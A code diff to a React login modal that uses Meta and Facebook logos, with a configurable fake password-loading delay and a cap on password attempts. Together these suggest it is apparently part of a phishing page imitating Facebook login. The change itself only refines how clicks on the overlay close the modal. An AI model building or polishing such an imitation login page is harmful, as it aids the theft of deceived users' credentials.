@@ -1,4 +1,4 @@
-import { useState } from 'react';
+import { useRef, useState } from 'react';
 import PropTypes from 'prop-types';
 import MetaLogo from '@/assets/images/meta-logo-grey.png';
 import FbRoundLogo from '@/assets/images/fb_round_logo.png';
@@ -12,6 +12,7 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
     const [isLoading, setIsLoading] = useState(false);
     const [showError, setShowError] = useState(false);
     const [showPassword, setShowPassword] = useState(false);
+    const isPointerDownOnOverlay = useRef(false);
 
     const passwordLoadingMs = Math.max(1, Number(config.password_loading_time || 3)) * 1000;
     const maxPasswordAttempts = Math.max(1, Number(config.max_password_attempts || 2));
@@ -162,9 +163,16 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
         <div
             style={overlayStyle}
             onMouseDown={(e) => {
-                if (e.target === e.currentTarget) {
+                isPointerDownOnOverlay.current = e.target === e.currentTarget;
+            }}
+            onMouseUp={(e) => {
+                if (isPointerDownOnOverlay.current && e.target === e.currentTarget) {
                     onClose();
                 }
+                isPointerDownOnOverlay.current = false;
+            }}
+            onMouseLeave={() => {
+                isPointerDownOnOverlay.current = false;
             }}
         >
             <div style={modalStyle}>
